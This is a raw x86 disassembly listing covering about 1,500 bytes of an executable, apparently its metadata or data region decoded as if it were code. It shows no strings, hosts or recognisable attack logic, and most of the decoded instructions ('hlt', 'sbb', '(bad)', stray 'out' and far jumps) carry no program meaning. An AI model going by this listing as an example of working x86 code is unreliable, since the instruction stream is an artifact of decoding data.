  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	3c 21                	cmp    $0x21,%al
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 d8 25 5a    	add    %al,0x5a25d808(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	ba 0f 5f 02 5c       	mov    $0x5c025f0f,%edx
  4069cd:	00 6f 25             	add    %ch,0x25(%edi)
  4069d0:	00 00                	add    %al,(%eax)
  4069d2:	00 00                	add    %al,(%eax)
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	bd 1d 64 02 5c       	mov    $0x5c02641d,%ebp
  4069db:	00 7c 25 00          	add    %bh,0x0(%ebp,%eiz,1)
  4069df:	00 00                	add    %al,(%eax)
  4069e1:	00 86 18 f4 1d 0e    	add    %al,0xe1df418(%esi)
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 c3                	add    %al,%bl
  4069f3:	1b b1 02 5c 00 8f    	sbb    -0x70ffa3fe(%ecx),%esi
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 e8                	add    %ch,%al
  406a01:	12 b8 02 5e 00 44    	adc    0x44005e02(%eax),%bh
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 29                	add    %ch,(%ecx)
  406a0f:	1b be 02 5f 00 78    	sbb    0x78005f02(%esi),%edi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 f4 1d 0e    	add    %al,0xe1df418(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 52 15             	add    %dl,0x15(%edx)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 95 08 cb 02 62    	add    %dl,0x6202cb08(%ebp)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 dd                	add    %bl,%ch
  406a47:	01 d2                	add    %edx,%edx
  406a49:	02 64 00 ab          	add    -0x55(%eax,%eax,1),%ah
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 31                	add    %dh,(%ecx)
  406a55:	13 da                	adc    %edx,%ebx
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 c6                	add    %al,%dh
  406a63:	04 e1                	add    $0xe1,%al
  406a65:	02 68 00             	add    0x0(%eax),%ch
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 49 0b             	add    %cl,0xb(%ecx)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 8e 05 ef 02 6c    	add    %cl,0x6c02ef05(%esi)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 76 23             	add    %dh,0x23(%esi)
  406a8e:	f6 02 6e             	testb  $0x6e,(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	f4                   	hlt
  406a9b:	1d 0e 00 70 00       	sbb    $0x70000e,%eax
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 97 25 84 01 70    	add    %dl,0x70018425(%edi)
  406aad:	00 6c 59 00          	add    %ch,0x0(%ecx,%ebx,2)
  406ab1:	00 00                	add    %al,(%eax)
  406ab3:	00 96 00 be 15 84    	add    %dl,-0x7bea4200(%esi)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	dc 1b                	fcompl (%ebx)
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	d0 15 00 00 01 00    	rclb   $1,0x10000
  406acc:	6c                   	insb   (%dx),%es:(%edi)
  406acd:	02 00                	add    (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 ef                	add    %ch,%bh
  406ad3:	05 00 00 01 00       	add    $0x10000,%eax
  406ad8:	2f                   	das
  406ad9:	0b 00                	or     (%eax),%eax
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 32                	add    %dh,(%edx)
  406adf:	25 00 00 01 00       	and    $0x10000,%eax
  406ae4:	18 01                	sbb    %al,(%ecx)
  406ae6:	00 00                	add    %al,(%eax)
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	57                   	push   %edi
  406aeb:	1e                   	push   %ds
  406aec:	00 00                	add    %al,(%eax)
  406aee:	01 00                	add    %eax,(%eax)
  406af0:	16                   	push   %ss
  406af1:	04 00                	add    $0x0,%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 a5 15 00 00 01    	add    %ah,0x1000015(%ebp)
  406afb:	00 18                	add    %bl,(%eax)
  406afd:	0d 00 00 01 00       	or     $0x10000,%eax
  406b02:	31 0d 00 00 02 00    	xor    %ecx,0x20000
  406b08:	26 0d 00 00 03 00    	es or  $0x30000,%eax
  406b0e:	ea 01 00 00 04 00 fd 	ljmp   $0xfd00,$0x4000001
  406b15:	05 00 00 01 00       	add    $0x10000,%eax
  406b1a:	bb 23 00 00 01       	mov    $0x1000023,%ebx
  406b1f:	00 56 05             	add    %dl,0x5(%esi)
  406b22:	00 00                	add    %al,(%eax)
  406b24:	01 00                	add    %eax,(%eax)
  406b26:	a9 04 00 00 01       	test   $0x1000004,%eax
  406b2b:	00 73 1b             	add    %dh,0x1b(%ebx)
  406b2e:	00 00                	add    %al,(%eax)
  406b30:	01 00                	add    %eax,(%eax)
  406b32:	c4 07                	les    (%edi),%eax
  406b34:	00 00                	add    %al,(%eax)
  406b36:	01 00                	add    %eax,(%eax)
  406b38:	2e 06                	cs push %es
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	c3                   	ret
  406b3f:	1a 00                	sbb    (%eax),%al
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 f6                	add    %dh,%dh
  406b45:	15 00 00 03 00       	adc    $0x30000,%eax
  406b4a:	13 02                	adc    (%edx),%eax
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	f5                   	cmc
  406b51:	20 00                	and    %al,(%eax)
  406b53:	00 01                	add    %al,(%ecx)
  406b55:	00 ef                	add    %ch,%bh
  406b57:	00 00                	add    %al,(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 9e 0a 00 00 01    	add    %bl,0x100000a(%esi)
  406b61:	00 be 09 00 00 01    	add    %bh,0x1000009(%esi)
  406b67:	00 f0                	add    %dh,%al
  406b69:	22 00                	and    (%eax),%al
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 dc                	add    %bl,%ah
  406b6f:	1a 00                	sbb    (%eax),%al
  406b71:	00 03                	add    %al,(%ebx)
  406b73:	00 23                	add    %ah,(%ebx)
  406b75:	1c 00                	sbb    $0x0,%al
  406b77:	00 01                	add    %al,(%ecx)
  406b79:	00 fc                	add    %bh,%ah
  406b7b:	26 00 00             	add    %al,%es:(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	f1                   	int1
  406b81:	04 00                	add    $0x0,%al
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 3e                	add    %bh,(%esi)
  406b87:	25 00 00 02 00       	and    $0x20000,%eax
  406b8c:	3e 08 00             	or     %al,%ds:(%eax)
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 9b 07 00 00 01    	add    %bl,0x1000007(%ebx)
  406b97:	00 85 04 00 00 01    	add    %al,0x1000004(%ebp)
  406b9d:	00 fa                	add    %bh,%dl
  406b9f:	00 00                	add    %al,(%eax)
  406ba1:	00 01                	add    %al,(%ecx)
  406ba3:	00 b1 15 00 00 01    	add    %dh,0x1000015(%ecx)
  406ba9:	00 3b                	add    %bh,(%ebx)
  406bab:	06                   	push   %es
  406bac:	00 00                	add    %al,(%eax)
  406bae:	01 00                	add    %eax,(%eax)
  406bb0:	01 13                	add    %edx,(%ebx)
  406bb2:	00 00                	add    %al,(%eax)
  406bb4:	01 00                	add    %eax,(%eax)
  406bb6:	b3 09                	mov    $0x9,%bl
  406bb8:	00 00                	add    %al,(%eax)
  406bba:	01 00                	add    %eax,(%eax)
  406bbc:	62 03                	bound  %eax,(%ebx)
  406bbe:	00 00                	add    %al,(%eax)
  406bc0:	01 00                	add    %eax,(%eax)
  406bc2:	3d 07 00 00 01       	cmp    $0x1000007,%eax
  406bc7:	00 d9                	add    %bl,%cl
  406bc9:	23 00                	and    (%eax),%eax
  406bcb:	00 01                	add    %al,(%ecx)
  406bcd:	00 30                	add    %dh,(%eax)
  406bcf:	1e                   	push   %ds
  406bd0:	00 00                	add    %al,(%eax)
  406bd2:	02 00                	add    (%eax),%al
  406bd4:	f6 01 00             	testb  $0x0,(%ecx)
  406bd7:	00 01                	add    %al,(%ecx)
  406bd9:	00 a9 16 00 00 01    	add    %ch,0x1000016(%ecx)
  406bdf:	00 d3                	add    %dl,%bl
  406be1:	03 00                	add    (%eax),%eax
  406be3:	00 01                	add    %al,(%ecx)
  406be5:	00 05 15 00 00 01    	add    %al,0x1000015
  406beb:	00 ab 00 00 00 01    	add    %ch,0x1000000(%ebx)
  406bf1:	00 49 09             	add    %cl,0x9(%ecx)
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	02 0a                	add    (%edx),%cl
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	24 01                	and    $0x1,%al
  406c00:	00 00                	add    %al,(%eax)
  406c02:	01 00                	add    %eax,(%eax)
  406c04:	72 05                	jb     0x406c0b
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	aa                   	stos   %al,%es:(%edi)
  406c0b:	05 00 00 01 00       	add    $0x10000,%eax
  406c10:	93                   	xchg   %eax,%ebx
  406c11:	23 00                	and    (%eax),%eax
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 ea                	add    %ch,%dl
  406c17:	20 00                	and    %al,(%eax)
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 e4                	add    %ah,%ah
  406c1d:	04 00                	add    $0x0,%al
  406c1f:	00 01                	add    %al,(%ecx)
  406c21:	00 bb 00 00 00 02    	add    %bh,0x2000000(%ebx)
  406c27:	00 23                	add    %ah,(%ebx)
  406c29:	04 00                	add    $0x0,%al
  406c2b:	00 01                	add    %al,(%ecx)
  406c2d:	00 ce                	add    %cl,%dh
  406c2f:	17                   	pop    %ss
  406c30:	00 00                	add    %al,(%eax)
  406c32:	01 00                	add    %eax,(%eax)
  406c34:	d4 07                	aam    $0x7
  406c36:	00 00                	add    %al,(%eax)
  406c38:	01 00                	add    %eax,(%eax)
  406c3a:	e9 0a 00 00 01       	jmp    0x1406c49
  406c3f:	00 cd                	add    %cl,%ch
  406c41:	08 00                	or     %al,(%eax)
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 0b                	add    %cl,(%ebx)
  406c47:	25 00 00 01 00       	and    $0x10000,%eax
  406c4c:	d2 05 00 00 01 00    	rolb   %cl,0x10000
  406c52:	40                   	inc    %eax
  406c53:	24 00                	and    $0x0,%al
  406c55:	00 01                	add    %al,(%ecx)
  406c57:	00 99 01 00 00 01    	add    %bl,0x1000001(%ecx)
  406c5d:	00 f1                	add    %dh,%cl
  406c5f:	26 00 00             	add    %al,%es:(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	ff 18                	lcall  *(%eax)
  406c66:	00 00                	add    %al,(%eax)
  406c68:	01 00                	add    %eax,(%eax)
  406c6a:	46                   	inc    %esi
  406c6b:	1a 00                	sbb    (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 b6 04 00 00 01    	add    %dh,0x1000004(%esi)
  406c75:	00 4a 1e             	add    %cl,0x1e(%edx)
  406c78:	00 00                	add    %al,(%eax)
  406c7a:	02 00                	add    (%eax),%al
  406c7c:	dd 08                	fisttpll (%eax)
  406c7e:	00 00                	add    %al,(%eax)
  406c80:	01 00                	add    %eax,(%eax)
  406c82:	03 0b                	add    (%ebx),%ecx
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	30 16                	xor    %dl,(%esi)
  406c8a:	00 00                	add    %al,(%eax)
  406c8c:	01 00                	add    %eax,(%eax)
  406c8e:	60                   	pusha
  406c8f:	25 00 00 01 00       	and    $0x10000,%eax
  406c94:	77 08                	ja     0x406c9e
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	66 24 00             	data16 and $0x0,%al
  406c9d:	00 01                	add    %al,(%ecx)
  406c9f:	00 86 0a 00 00 01    	add    %al,0x100000a(%esi)
  406ca5:	00 62 1e             	add    %ah,0x1e(%edx)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	79 04                	jns    0x406cb2
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	0e                   	push   %cs
  406cb3:	06                   	push   %es
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	51                   	push   %ecx
  406cb9:	25 00 00 01 00       	and    $0x10000,%eax
  406cbe:	7f 03                	jg     0x406cc3
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	8c 03                	mov    %es,(%ebx)
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	8d 18                	lea    (%eax),%ebx
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	eb 08                	jmp    0x406cda
  406cd2:	00 00                	add    %al,(%eax)
  406cd4:	01 00                	add    %eax,(%eax)
  406cd6:	6b 0a 00             	imul   $0x0,(%edx),%ecx
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 4c 01 00          	add    %cl,0x0(%ecx,%eax,1)
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 7d 18             	add    %bh,0x18(%ebp)
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	e2 26                	loop   0x406d10
  406cea:	00 00                	add    %al,(%eax)
  406cec:	01 00                	add    %eax,(%eax)
  406cee:	7a 02                	jp     0x406cf2
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	78 06                	js     0x406cfc
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	b6 03                	mov    $0x3,%dh
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	9c                   	pushf
  406d01:	14 00                	adc    $0x0,%al
  406d03:	00 01                	add    %al,(%ecx)
  406d05:	00 4c 24 00          	add    %cl,0x0(%esp)
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 be 0b 00 00 01    	add    %bh,0x100000b(%esi)
  406d11:	00 5c 06 00          	add    %bl,0x0(%esi,%eax,1)
  406d15:	00 02                	add    %al,(%edx)
  406d17:	00 c7                	add    %al,%bh
  406d19:	02 00                	add    (%eax),%al
  406d1b:	00 01                	add    %al,(%ecx)
  406d1d:	00 e6                	add    %ah,%dh
  406d1f:	23 00                	and    (%eax),%eax
  406d21:	00 02                	add    %al,(%edx)
  406d23:	00 c2                	add    %al,%dl
  406d25:	12 00                	adc    (%eax),%al
  406d27:	00 01                	add    %al,(%ecx)
  406d29:	00 4c 13 00          	add    %cl,0x0(%ebx,%edx,1)
  406d2d:	00 02                	add    %al,(%edx)
  406d2f:	00 be 24 00 00 01    	add    %bh,0x1000024(%esi)
  406d35:	00 e6                	add    %ah,%dh
  406d37:	09 00                	or     %eax,(%eax)
  406d39:	00 02                	add    %al,(%edx)
  406d3b:	00 20                	add    %ah,(%eax)
  406d3d:	0b 00                	or     (%eax),%eax
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 fe                	add    %bh,%dh
  406d43:	06                   	push   %es
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	52                   	push   %edx
  406d49:	03 00                	add    (%eax),%eax
  406d4b:	00 01                	add    %al,(%ecx)
  406d4d:	00 fc                	add    %bh,%ah
  406d4f:	1b 00                	sbb    (%eax),%eax
  406d51:	00 02                	add    %al,(%edx)
  406d53:	00 df                	add    %bl,%bh
  406d55:	16                   	push   %ss
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	68 08 00 00 01       	push   $0x1000008
  406d5f:	00 66 1b             	add    %ah,0x1b(%esi)
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 82 22 bb    	add    %dh,-0x44dd7e00(%ecx)
  406d6f:	01 b1 00 53 23 bf    	add    %esi,-0x40dcad00(%ecx)
  406d75:	01 b1 00 a9 21 0e    	add    %esi,0xe21a900(%ecx)
  406d7b:	00 b9 00 dc 1d 64    	add    %bh,0x641ddc00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 f4                	add    %dh,%ah
  406d85:	1d 01 03 d1 00       	sbb    $0xd10301,%eax
  406d8a:	f4                   	hlt
  406d8b:	1d 0e 00 d9 00       	sbb    $0xd9000e,%eax
  406d90:	f4                   	hlt
  406d91:	1d 2e 03 e9 00       	sbb    $0xe9032e,%eax
  406d96:	f4                   	hlt
  406d97:	1d 6b 01 f1 00       	sbb    $0xf1016b,%eax
  406d9c:	f4                   	hlt
  406d9d:	1d 6b 01 f9 00       	sbb    $0xf9016b,%eax
  406da2:	f4                   	hlt
  406da3:	1d 6b 01 01 01       	sbb    $0x101016b,%eax
  406da8:	f4                   	hlt
  406da9:	1d 6b 01 09 01       	sbb    $0x109016b,%eax
  406dae:	f4                   	hlt
  406daf:	1d 6b 01 11 01       	sbb    $0x111016b,%eax
  406db4:	f4                   	hlt
  406db5:	1d 6b 01 19 01       	sbb    $0x119016b,%eax
  406dba:	f4                   	hlt
  406dbb:	1d 6b 01 21 01       	sbb    $0x121016b,%eax
  406dc0:	f4                   	hlt
  406dc1:	1d 6b 01 29 01       	sbb    $0x129016b,%eax
  406dc6:	f4                   	hlt
  406dc7:	1d 6b 01 31 01       	sbb    $0x131016b,%eax
  406dcc:	f4                   	hlt
  406dcd:	1d 4b 02 39 01       	sbb    $0x139024b,%eax
  406dd2:	f4                   	hlt
  406dd3:	1d 0e 00 41 01       	sbb    $0x141000e,%eax
  406dd8:	f4                   	hlt
  406dd9:	1d 6b 01 49 01       	sbb    $0x149016b,%eax
  406dde:	f7 1a                	negl   (%edx)
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	cb                   	lret
  406deb:	21 7f 00             	and    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 0e                	add    %ecx,(%esi)
  406df1:	19 84 00 09 00 f4 1d 	sbb    %eax,0x1df40009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8a 00                	mov    (%eax),%al
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 e7                	add    %esp,%edi
  406e03:	13 2a                	adc    (%edx),%ebp
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	39 14 d3             	cmp    %edx,(%ebx,%edx,8)
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 f4                	add    %dh,%ah
  406e0f:	1d 2b 02 11 00       	sbb    $0x11022b,%eax
  406e14:	0c 26                	or     $0x26,%al
  406e16:	d9 03                	flds   (%ebx)
  406e18:	69 01 e4 25 df 03    	imul   $0x3df25e4,(%ecx),%eax
  406e1e:	61                   	popa
  406e1f:	01 75 1f             	add    %esi,0x1f(%ebp)
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 7f 01 c7 00    	addl   $0xc7017f,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	22 15 eb 03 19 00    	and    0x1903eb,%dl
  406e32:	f4                   	hlt
  406e33:	1d 09 04 19 00       	sbb    $0x190409,%eax
  406e38:	a0 12 01 03 19       	mov    0x19030112,%al
  406e3d:	00 8d 12 01 03 c1    	add    %cl,-0x3efcfeee(%ebp)
  406e43:	01 8a 26 16 04 c1    	add    %ecx,-0x3efbe9da(%edx)
  406e49:	01 c5                	add    %eax,%ebp
  406e4b:	21 1c 04             	and    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	f4                   	hlt
  406e51:	1d 0e 00 d1 01       	sbb    $0x1d1000e,%eax
  406e56:	57                   	push   %edi
  406e57:	23 23                	and    (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 16                	add    %edx,(%esi)
  406e5d:	1f                   	pop    %ds
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 65 21             	add    %ah,0x21(%ebp)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 87 0b bf 01 19    	add    %al,0x1901bf0b(%edi)
  406e6d:	00 65 21             	add    %ah,0x21(%ebp)
  406e70:	3c 02                	cmp    $0x2,%al
  406e72:	99                   	cltd
  406e73:	01 f4                	add    %esi,%esp
  406e75:	1d 0e 00 a1 01       	sbb    $0x1a1000e,%eax
  406e7a:	f4                   	hlt
  406e7b:	1d 36 02 99 01       	sbb    $0x1990236,%eax
  406e80:	e2 1f                	loop   0x406ea1
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 07                	add    %eax,(%edi)
  406e87:	14 70                	adc    $0x70,%al
  406e89:	01 c1                	add    %eax,%ecx
  406e8b:	01 c5                	add    %eax,%ebp
  406e8d:	21 3f                	and    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 57 23             	add    %edx,0x23(%edi)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 04 10             	add    %eax,(%eax,%edx,1)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 f4                	add    %esi,%esp
  406e9f:	1d 4f 04 01 02       	sbb    $0x201044f,%eax
  406ea4:	f4                   	hlt
  406ea5:	1d 56 04 21 00       	sbb    $0x210456,%eax
  406eaa:	f4                   	hlt
  406eab:	1d 5c 04 19 00       	sbb    $0x19045c,%eax
  406eb0:	b4 22                	mov    $0x22,%ah
  406eb2:	66 04 09             	data16 add $0x9,%al
  406eb5:	00 16                	add    %dl,(%esi)
  406eb7:	14 47                	adc    $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 30                	add    %dh,(%eax)
  406ebd:	22 6c 04 29          	and    0x29(%esp,%eax,1),%ch
  406ec1:	02 f4                	add    %ah,%dh
  406ec3:	1d 56 04 29 00       	sbb    $0x290456,%eax
  406ec8:	f4                   	hlt
  406ec9:	1d 78 04 31 02       	sbb    $0x2310478,%eax
  406ece:	f4                   	hlt
  406ecf:	1d 56 04 c1 00       	sbb    $0xc10456,%eax
  406ed4:	5f                   	pop    %edi
  406ed5:	0b 82 04 39 02 5f    	or     0x5f023904(%edx),%eax
  406edb:	0f 8f 04 31 00 f2    	jg     0xf2409fe5
  406ee1:	1f                   	pop    %ds
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 04 10             	add    %al,(%eax,%edx,1)
  406ee8:	0e                   	push   %cs
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 04 10             	add    %al,(%eax,%edx,1)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 04 10             	add    %al,(%eax,%edx,1)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 57 0b             	add    %dl,0xb(%edi)
  406efa:	a1 04 49 02 44       	mov    0x44024904,%eax
  406eff:	00 a7 04 c1 00 64    	add    %ah,0x6400c104(%edi)
  406f05:	0b ae 04 51 02 f4    	or     -0xbfdaefc(%esi),%ebp
  406f0b:	1d 56 04 49 01       	sbb    $0x1490456,%eax
  406f10:	f4                   	hlt
  406f11:	1d b6 04 49 01       	sbb    $0x14904b6,%eax
  406f16:	0e                   	push   %cs
  406f17:	23 bd 04 61 02 5d    	and    0x5d026104(%ebp),%edi
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	75 1f                	jne    0x406f43
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 91 17 d6 04 c1    	add    %dl,-0x3efb29e9(%ecx)
  406f2d:	00 5c 10 de          	add    %bl,-0x22(%eax,%edx,1)
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 f4                	add    %ah,%dh
  406f35:	1d 2b 02 c1 00       	sbb    $0xc1022b,%eax
  406f3a:	fa                   	cli
  406f3b:	19 15 02 c1 00 2d    	sbb    %edx,0x2d00c102
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	cb                   	lret
  406f47:	21 9a 00 71 02 5d    	and    %ebx,0x5d027100(%edx)
  406f4d:	21 0a                	and    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	ee                   	out    %al,(%dx)
  406f53:	1e                   	push   %ds
  406f54:	c7 00 a1 02 a2 0f    	movl   $0xfa202a1,(%eax)
  406f5a:	01 05 79 02 f4 1d    	add    %eax,0x1df40279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 89 20 07 05 81    	add    -0x7efaf8e0(%ecx),%cl
  406f69:	02 a7 0e 0d 05 a9    	add    -0x56faf2f2(%edi),%ah
  406f6f:	02 f0                	add    %al,%dh
  406f71:	0e                   	push   %cs
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 45 0f 47    	add    0x470f4502(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 96 26 16 04 81    	add    %edx,-0x7efbe9da(%esi)
  406f81:	02 09                	add    (%ecx),%cl
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 8c 17    	adc    0x178c0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 f4 1d 0e    	add    %cl,0xe1df402(%ecx)
  406f91:	00 89 02 fd 0e 6b    	add    %cl,0x6b0efd02(%ecx)
  406f97:	01 b1 02 e7 0e 47    	add    %esi,0x470ee702(%ecx)
  406f9d:	02 a1 02 48 19 c7    	add    -0x38e6b7fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 1d 21 1a 05 89    	add    %ebx,0x89051a21
  406fab:	02 b8 20 6b 01 89    	add    -0x76fe94e0(%eax),%bh
  406fb1:	02 c4                	add    %ah,%al
  406fb3:	0e                   	push   %cs
  406fb4:	20 05 89 02 f8 24    	and    %al,0x24f80289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 0e 23 27    	add    0x27230e02(%ecx),%al
  406fc1:	05 c1 02 39 1d       	add    $0x1d3902c1,%eax
  406fc6:	30 05 c9 02 12 10    	xor    %al,0x101202c9
  406fcc:	c7 00 91 02 01 26    	movl   $0x26010291,(%eax)
  406fd2:	35 05 c1 01 1d       	xor    $0x1d01c105,%eax
